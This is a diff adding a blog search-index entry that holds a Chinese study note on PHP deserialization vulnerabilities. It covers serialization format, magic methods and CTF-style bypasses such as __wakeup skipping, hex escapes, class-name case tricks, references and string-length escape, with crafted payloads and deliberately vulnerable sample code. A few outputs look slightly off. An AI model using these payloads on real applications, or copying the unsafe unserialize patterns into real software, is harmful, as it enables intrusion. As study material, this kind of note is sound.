@@ -96,6 +96,400 @@
       </tags>
   </entry>
   <entry>
+    <title>php反序列化学习记录</title>
+    <url>/2024/03/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="前置代码条件："><a href="#前置代码条件：" class="headerlink" title="前置代码条件："></a>前置代码条件：</h2><h3 id="this"><a href="#this" class="headerlink" title="$this-&gt;"></a>$this-&gt;</h3><p><code>$this</code>在oop(面向对象编程)中是伪变量，是对一个对象示例的引用。伪变量不是真正的变量，形式上是变量。变量中存储的是固定的值，<code>$this</code>中并没有，哪个对象调用，<code>$this</code>就代表哪个对象， 也可以将<code>$this</code>理解为对象的引用，通过引用的方式访问一个对象的方法和属性。</p>
+<p><code>&lt;?php echo $this-&gt;tpl_id?&gt;</code>中(<code>$this-&gt;</code>表示实例化后调用具体对象)</p>
+<span id="more"></span>
+
+<p><strong>实列</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	//创建一个类</span><br><span class="line">	Class Stu &#123;</span><br><span class="line">		public $name = &#x27; &#x27;;</span><br><span class="line">		public $age = 0;</span><br><span class="line">		//定义一个公共访问接口</span><br><span class="line">		public function say($name,$age)&#123;</span><br><span class="line">			$this-&gt;name = $name;</span><br><span class="line">			$this-&gt;age = $age;</span><br><span class="line">			return &#x27;我的名字是&#x27;.$this-&gt;name.</span><br><span class="line">						&#x27;今年我&#x27;.$this-&gt;age;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	//实例化两个对象</span><br><span class="line">	$jack = new Stu();</span><br><span class="line">	$smith = new Stu();</span><br><span class="line">	echo $jack-&gt;say(&#x27;jack&#x27;,30);</span><br><span class="line">	echo $smith-&gt;say(&#x27;smith&#x27;,20);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id=""><a href="#" class="headerlink" title="::"></a>::</h3><p><code>::</code>用来直接调用类中的属性或方法，没有实例化)</p>
+<p><strong>实例</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	Class b &#123;</span><br><span class="line">		var $name = &quot;test&quot;;</span><br><span class="line">		Function getName()&#123;</span><br><span class="line">			echo &#x27;test is good&#x27;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">//直接调用</span><br><span class="line">echo b::getName();//输出为test is good</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="什么是序列化，什么是反序列化？"><a href="#什么是序列化，什么是反序列化？" class="headerlink" title="什么是序列化，什么是反序列化？"></a>什么是序列化，什么是反序列化？</h2><h3 id="php序列化：serialize"><a href="#php序列化：serialize" class="headerlink" title="php序列化：serialize()"></a>php序列化：<code>serialize()</code></h3><p>序列化是将变量或对象转换成字符串的过程，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</p>
+<p>php序列化的字母标识：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a - <span class="keyword">array</span></span><br><span class="line">b - <span class="keyword">boolean</span></span><br><span class="line">d - <span class="keyword">double</span></span><br><span class="line">i - <span class="keyword">integer</span></span><br><span class="line">o - common <span class="keyword">object</span></span><br><span class="line">r - reference</span><br><span class="line">s - <span class="keyword">string</span></span><br><span class="line">C - custom <span class="keyword">object</span></span><br><span class="line">O - <span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">N</span> - <span class="title">null</span></span></span><br><span class="line"><span class="class"><span class="title">R</span> - <span class="title">pointer</span> <span class="title">reference</span></span></span><br><span class="line"><span class="class"><span class="title">U</span> - <span class="title">unicode</span> <span class="title">string</span></span></span><br><span class="line"><span class="class"><span class="title">N</span> - <span class="title">NULL</span></span></span><br></pre></td></tr></table></figure>
+<h4 id="实列及详解"><a href="#实列及详解" class="headerlink" title="实列及详解"></a>实列及详解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class TEST&#123;  </span><br><span class="line"> public $test1=&quot;11&quot;;  </span><br><span class="line"> private $test2=&quot;22&quot;;  </span><br><span class="line"> protected $test3=&quot;33&quot;;  </span><br><span class="line"> public function test4()  </span><br><span class="line"> &#123;  </span><br><span class="line"> echo $this-&gt;test1;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=new TEST();  </span><br><span class="line">echo serialize($a); </span><br></pre></td></tr></table></figure>
+
+<p>输出为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">o:4:&quot;TEST&quot;:3:&#123;s:5:&quot;test1&quot;;s:2:&quot;11&quot;;s:11:&quot; TEST test2&quot;;s:2:&quot;22&quot;;s:8:&quot; * test3&quot;;s:2:&quot;33&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>详解：</p>
+<ul>
+<li><code>o</code>代表类，<code>4</code>代表类名长度，<code>&quot;&quot;</code>中是类名</li>
+<li><code>3</code>表示类中的变量个数，<code>&#123;&#125;</code>中则是以<code>类型：长度：&quot;值&quot;</code>为格式依次展示类中变量</li>
+</ul>
+<p><strong>注意序列化后的内容只有成员变量，没有成员函数，比如下面的例子：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;xiaoshizi&quot;;</span><br><span class="line">        $this-&gt;b = &quot;laoshizi&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function happy()&#123;</span><br><span class="line">        return $this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;xiaoshizi&quot;;s:1:&quot;b&quot;;s:8:&quot;laoshizi&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意类中变量前的函数</strong></p>
+<ul>
+<li><p>如果是public，则直接输出</p>
+</li>
+<li><p>如果变量前是protected，则会在变量名前加上 <code>\x00*\x00</code></p>
+</li>
+<li><p>如果变量前是private，则会在变量名前加上 <code>\x00类名\x00属性名</code></p>
+</li>
+</ul>
+<p>如果直接输出，则会导致不可见字符 <code>\x00</code> 丢失变成空格 <code>  </code></p>
+<h3 id="php反序列化：unserialize"><a href="#php反序列化：unserialize" class="headerlink" title="php反序列化：unserialize()"></a>php反序列化：<code>unserialize()</code></h3><p>反序列化是将字符串转换成变量或对象的过程</p>
+<p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。这样说可能还不是很具体，举个列子比如你网购买一个架子，发货为节省成本，是拆开给你发过去，到你手上，然后给你说明书让你组装，拆开给你这个过程可以说是序列化，你组装的过程就是反序列化.</p>
+<h4 id="实列及详解-1"><a href="#实列及详解-1" class="headerlink" title="实列及详解"></a>实列及详解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class people</span><br><span class="line">&#123;</span><br><span class="line"> public $name = &quot;f1r3K0&quot;;</span><br><span class="line"> public $age = &#x27;18&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$class =  new people();</span><br><span class="line">$class_ser = serialize($class);</span><br><span class="line">print_r($class_ser);</span><br><span class="line">$class_unser = unserialize($class_ser);</span><br><span class="line">print_r($class_unser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;people&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;f1r3K0&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br><span class="line">people Object</span><br><span class="line">(</span><br><span class="line">    [name] =&gt; f1r3K0</span><br><span class="line">    [age] =&gt; 18</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意当使用 <code>unserialize()</code> 恢复对象时， 将调用 <code>__wakeup()</code> 成员函数</strong></p>
+<h4 id="Magic-function"><a href="#Magic-function" class="headerlink" title="Magic function"></a>Magic function</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct //当一个对象创建时被调用，即在程序的开头被调用</span><br><span class="line">__destruct //当一个对象销毁时被调用，即在程序的结尾被调用</span><br><span class="line">__toString //当一个对象被当作一个字符串被调用</span><br><span class="line">__wakeup() //使用unserialize时触发</span><br><span class="line">__sleep() //使用serialize时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //对不存在的方法或者不可访问的方法进行调用就自动调用</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
+
+<p>魔术方法指的是一种特殊方法当对对象执行某些操作时会覆盖 PHP 的默认操作</p>
+<p>重点关注以下几个：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</span><br><span class="line">__destruct()：析构函数，类似于C++。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行，当对象被销毁时会自动调用。</span><br><span class="line">__wakeup()：如前所提，unserialize()时会检查是否存在 __wakeup()，如果存在，则会优先调用 __wakeup()方法。</span><br><span class="line">__toString():用于处理一个类被当成字符串时应怎样回应，因此当一个对象被当作一个字符串时就会调用。</span><br><span class="line">__sleep():用于提交未提交的数据，或类似的清理操作，因此当一个对象被序列化的时候被调用。</span><br></pre></td></tr></table></figure>
+
+<h5 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h5><p>简单描述就是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p>
+<p><strong>实列及详解</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include &#x27;class.php&#x27;;  </span><br><span class="line">$select = $_GET[&#x27;select&#x27;];  </span><br><span class="line">$res=unserialize(@$select); //将@放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</span><br><span class="line"></span><br><span class="line">&lt;?php  </span><br><span class="line">include &#x27;flag.php&#x27;;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;  </span><br><span class="line"> private $username = &#x27;nonono&#x27;;  </span><br><span class="line"> private $password = &#x27;yesyes&#x27;;  </span><br><span class="line"></span><br><span class="line"> public function __construct($username,$password)&#123;  </span><br><span class="line"> $this-&gt;username = $username;  </span><br><span class="line"> $this-&gt;password = $password;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> function __wakeup()&#123;  </span><br><span class="line"> $this-&gt;username = &#x27;guest&#x27;;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> function __destruct()&#123;  </span><br><span class="line"> if ($this-&gt;password != 100) &#123;  </span><br><span class="line"> echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;  </span><br><span class="line"> echo &quot;You name is: &quot;;  </span><br><span class="line"> echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;  </span><br><span class="line"> echo &quot;You password is: &quot;;  </span><br><span class="line"> echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;  </span><br><span class="line"> die();  </span><br><span class="line"> &#125;  </span><br><span class="line"> if ($this-&gt;username === &#x27;admin&#x27;) &#123;  </span><br><span class="line"> global $flag;  </span><br><span class="line"> echo $flag;  </span><br><span class="line"> &#125;else&#123;  </span><br><span class="line"> echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;  </span><br><span class="line"> die();  </span><br><span class="line"></span><br><span class="line"> &#125;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看源码我们需要<code>password=100，username=admin</code>。如果单纯输入<code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot; Name username&quot;;s:5:&quot;admin&quot;;s:14:&quot; Name password&quot;;s:3:&quot;100&quot;;&#125;</code>反序列化过程中<code>__wakeup</code>方法里会把username赋值为guest。此时我们要修改类数使其大于2，就可以绕过<code>__wakeup</code>方法。注意是用<code>GET</code>方式，但是别忘了要Url编码。</p>
+<p>如何偷懒得到序列化格式？直接在源码后面编个脚本就行啦！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new Name(&#x27;admin&#x27;,&#x27;100&#x27;);  </span><br><span class="line">echo serialize($a);  </span><br><span class="line">echo urlencode(serialize($a));  </span><br></pre></td></tr></table></figure>
+<p>最终输出结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Url/?select = O%3A4%3A%22Name%22%3A4%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure>
+
+<h5 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:4:&quot;test&quot;:2:&#123;S:4:&quot;%00*%00\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="实例及详解"><a href="#实例及详解" class="headerlink" title="实例及详解"></a>实例及详解</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;admin&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function  __destruct()&#123;</span><br><span class="line">        echo 666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function check($data)&#123;</span><br><span class="line">    if(stristr($data, &#x27;username&#x27;)!==False)&#123;</span><br><span class="line">        echo(&quot;你绕不过！！&quot;.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由代码可知：username被ban了。</p>
+<p>原代码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>转换后为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>75是u的16进制编码。</p>
+<h5 id="php类名大小写绕过"><a href="#php类名大小写绕过" class="headerlink" title="php类名大小写绕过"></a>php类名大小写绕过</h5><p>php类名对大小写不敏感，而且过滤并没有过滤大小写</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;  </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;  </span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;  </span><br><span class="line"><span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"><span class="keyword">global</span> <span class="variable">$flag</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;  </span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显是触发析构函数就得到了flag，但是有过滤，如果匹配到了ctfshow就抛异常。所以可以构造CTFSHOW来绕过。</p>
+<h5 id="号绕过"><a href="#号绕过" class="headerlink" title="+号绕过"></a>+号绕过</h5><h5 id="利用-使两值恒等"><a href="#利用-使两值恒等" class="headerlink" title="利用&amp;使两值恒等"></a>利用&amp;使两值恒等</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);  </span><br><span class="line">include(&#x27;flag.php&#x27;);  </span><br><span class="line">highlight_file(__FILE__);  </span><br><span class="line">class ctfshowAdmin&#123;  </span><br><span class="line">public $token;  </span><br><span class="line">public $password;  </span><br><span class="line"></span><br><span class="line">public function __construct($t,$p)&#123;  </span><br><span class="line">$this-&gt;token=$t;  </span><br><span class="line">$this-&gt;password = $p;  </span><br><span class="line">&#125;  </span><br><span class="line">public function login()&#123;  </span><br><span class="line">return $this-&gt;token===$this-&gt;password;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);  </span><br><span class="line">$ctfshow-&gt;token=md5(mt_rand());  </span><br><span class="line"></span><br><span class="line">if($ctfshow-&gt;login())&#123;  </span><br><span class="line">echo $flag;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$ctfshow-&gt;login()</code>这个成立才给<code>flag</code>，<code>$ctfshow-&gt;token=md5(mt_rand())</code>但是是随机的</p>
+<p>知识点：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;11&#x27;</span>;  </span><br><span class="line"><span class="variable">$b</span>=&amp;<span class="variable">$a</span>;  </span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;<span class="comment">//$b被赋值的是变量a的地址，php是按地址传参，a的值会随b值变化  </span></span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure>
+
+<p>故可以用如下脚本达成目的：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;  </span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$token</span>;  </span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$password</span>;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"> <span class="variable language_">$this</span>-&gt;password = &amp;<span class="variable language_">$this</span>-&gt;token;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();  </span><br><span class="line"><span class="keyword">echo</span> ( <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>
+
+<h4 id="反序列化逃逸问题"><a href="#反序列化逃逸问题" class="headerlink" title="反序列化逃逸问题"></a>反序列化逃逸问题</h4><p>逃逸问题的本质是改变序列化字符串的长度，导致反序列化漏洞</p>
+<p>所以会有两种情况，一种是由长变短,一种是由短变长</p>
+<h5 id="由短变长"><a href="#由短变长" class="headerlink" title="由短变长"></a>由短变长</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function change($str)&#123;</span><br><span class="line">    return str_replace(&quot;x&quot;,&quot;xx&quot;,$str);</span><br><span class="line">&#125;</span><br><span class="line">$name = $_GET[&#x27;name&#x27;];</span><br><span class="line">$age = &quot;I am 11&quot;;</span><br><span class="line">$arr = array($name,$age);</span><br><span class="line">echo &quot;反序列化字符串：&quot;;</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;过滤后:&quot;;</span><br><span class="line">$old = change(serialize($arr));</span><br><span class="line">$new = unserialize($old);</span><br><span class="line">var_dump($new);</span><br><span class="line">echo &quot;&lt;br/&gt;此时，age=$new[1]&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>正常传入<code>name = mao</code>，输出为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(38) &quot;a:2:&#123;i:0;s:3:&quot;mao&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(3) &quot;mao&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;I am 11&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=I am 11</span><br></pre></td></tr></table></figure>
+
+<p>当传入<code>name = maox</code>时，就会出错：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(39) &quot;a:2:&#123;i:0;s:4:&quot;maox&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:bool(false)</span><br><span class="line">&lt;br/&gt;此时，age=</span><br></pre></td></tr></table></figure>
+
+<p>我们传入<code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>时，反而有输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(79) &quot;a:2:&#123;i:0;s:43:&quot;maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(43) &quot;maoxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(6) &quot;woaini&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=woaini</span><br></pre></td></tr></table></figure>
+
+<p>这是为什么？</p>
+<p>在反序列化时，底层代码是以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾。</p>
+<p><code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>这一部分一共二十个字符，由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>，从而造成<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>的溢出，而<code>&quot;</code>闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出<code>woaini</code>。最后的<code>;&#125;</code>闭合反序列化全过程导致原来的<code>&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</code>被舍弃，不影响反序列化过程。</p>
+<h5 id="由长变短"><a href="#由长变短" class="headerlink" title="由长变短"></a>由长变短</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function change($str)&#123;</span><br><span class="line">    return str_replace(&quot;xx&quot;,&quot;x&quot;,$str);</span><br><span class="line">&#125;</span><br><span class="line">$arr[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">$arr[&#x27;age&#x27;] = $_GET[&#x27;age&#x27;];</span><br><span class="line">echo &quot;反序列化字符串：&quot;;</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;过滤后:&quot;;</span><br><span class="line">$old = change(serialize($arr));</span><br><span class="line">var_dump($old);</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">$new = unserialize($old);</span><br><span class="line">var_dump($new);</span><br><span class="line">echo &quot;&lt;br/&gt;此时，age=&quot;;</span><br><span class="line">echo $new[&#x27;age&#x27;];</span><br></pre></td></tr></table></figure>
+
+<p>正常情况传入<code>name=mao&amp;age=11</code>，输出为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(46) &quot;a:2:&#123;s:4:&quot;name&quot;;s:3:&quot;mao&quot;;s:3:&quot;age&quot;;s:2:&quot;11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:string(46) &quot;a:2:&#123;s:4:&quot;name&quot;;s:3:&quot;mao&quot;;s:3:&quot;age&quot;;s:2:&quot;11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;array(2) &#123;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(3) &quot;mao&quot;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  string(2) &quot;11&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=11</span><br></pre></td></tr></table></figure>
+
+<p>我们传入<code>name=maoxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;</code>时，输出为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(46) &quot;a:2:&#123;s:4:&quot;name&quot;;s:43:&quot;maoxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;s:3:&quot;age&quot;;s:28:&quot;11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:string(94) &quot;a:2:&#123;s:4:&quot;name&quot;;s:43:&quot;maoxxxxxxxxxxxxxxxxxxxx&quot;;s:3:&quot;age&quot;;s:28:&quot;11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;array(2) &#123;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(43) &quot;maoxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  string(6) &quot;woaini&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=woaini</span><br></pre></td></tr></table></figure>
+
